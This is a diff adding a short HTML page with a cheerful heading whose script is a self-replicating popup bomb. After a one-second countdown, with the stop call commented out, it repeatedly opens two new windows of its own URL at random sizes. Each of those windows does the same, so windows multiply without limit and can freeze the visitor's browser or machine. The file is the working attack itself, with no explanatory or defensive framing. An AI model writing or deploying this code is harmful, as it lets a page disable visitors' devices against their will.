@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+        p {
+            font-size: 1.2rem;
+            max-width: 600px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        document.body.style.backgroundColor = '#' + Math.floor(Math.random()*16777215).toString(16);
+    </script>
+    <h1 style="text-align: center;">Welcome to My Page</h1>
+    <p style="text-align: center;">I'm gonna open myself in <span></span> seconds</p>
+
+    <script>
+        function createRandomWindow() {
+            const randomWidth = Math.floor(Math.random() * 1000);
+            const randomHeight = Math.floor(Math.random() * 800);
+            const randomTop = Math.floor(Math.random() * (screen.height - randomHeight));
+            const randomLeft = Math.floor(Math.random() * (screen.width - randomWidth));
+
+            return window.open(window.location.href, '', `width=${randomWidth},height=${randomHeight},top=${randomTop},left=${randomLeft}`);
+        }
+        
+        
+        let seconds = 1;
+        let span = document.querySelector('span');
+        span.textContent = seconds;
+        let interval = setInterval(() => {
+            seconds--;
+            span.textContent = seconds;
+            if (seconds < 0) {
+                // clearInterval(interval);
+                createRandomWindow();
+                createRandomWindow();
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
